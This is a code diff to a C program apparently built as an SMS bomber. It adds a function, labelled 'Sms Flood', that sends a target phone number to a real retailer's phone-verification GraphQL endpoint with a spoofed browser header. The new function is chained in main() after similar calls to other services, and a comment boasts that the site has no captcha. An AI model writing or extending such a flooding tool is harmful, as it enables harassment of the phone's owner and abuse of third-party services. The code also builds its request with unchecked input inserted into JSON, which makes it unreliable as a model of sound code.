@@ -135,6 +135,38 @@ void smsDostaevsky(char* phone) {
     curl_global_cleanup();
 }
 
+/* Ollis Sms Flood func*/
+void smsOllis(char* phone) {
+    CURL *curl;
+    CURLcode res;
+    char Buf[512]; // Buffer for Post data
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        /* Step2 - Post reqquest with cookie */
+        curl_easy_setopt(curl, CURLOPT_URL, "https://www.ollis.ru/gql");
+        chunk = curl_slist_append(chunk, "Host: www.ollis.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
+        chunk = curl_slist_append(chunk, "Content-Type: application/json;charset=utf-8");
+
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
+
+        sprintf(Buf, "{\"query\":\"mutation { phone(number:\\\"%s\\\", locale:ru) { token error { code message } } }\"}", phone);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+
+        curl_easy_cleanup(curl);
+
+    }
+    curl_global_cleanup();
+}
+
 int main(void)
 {
     char phone[16];
@@ -145,6 +177,7 @@ int main(void)
     SmsDelevery(phone);
     GetCookieDostaevsky(phone);
     smsDostaevsky(phone);
+    smsOllis(phone); // Ollis don't have cookie and capcha lol
+
     return 0;
 }
-
